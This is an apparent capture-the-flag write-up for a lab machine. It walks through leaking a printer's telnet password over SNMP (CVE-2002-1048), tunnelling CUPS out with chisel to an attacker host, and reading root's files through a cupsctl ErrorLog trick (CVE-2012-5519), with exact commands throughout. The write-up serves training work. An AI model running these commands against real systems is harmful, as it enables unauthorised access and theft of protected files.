@@ -1,0 +1,6 @@
+Started with a nmap scan
+```
+23 telnet HP Jetdirect
+161 snmp udp only
+```
+Since all we have is telnet open on tcp and if we do a udp scan there is a open SNMP port open doing some googling and there is a really old exploit for this `CVE-2002-1048` and if we send this command it will send us hex back `snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.11.2.3.9.1.1.13.0` and we get some hex back and can use cyberchef to decode the hex to `P@ssw0rd@123!!123` now we can access the telnet service and login we can use `exec` to exacute system commands and get the flag now we need to see what ports are open internally there is cups running on the host on port `631` running version `1.6.1` and there is a cve for a local file read `CVE-2012-5519` now we need to get a reverse shell and then use chisel to open the port so we can use the exploit getting chisel on the host and run this command `./chisel client 10.10.14.3:8000 R:631:127.0.0.1:631` and on are host `./chisel server server -p 8000 --reverse` and now if we go to `127.0.0.1:631` in are browser we can see the cups instance now we can use the exploit to view the error logs so if we telnet agin and run `exec cupsctl ErrorLog="/root/root.txt"` and then curl the file path on are host we get the root flag 
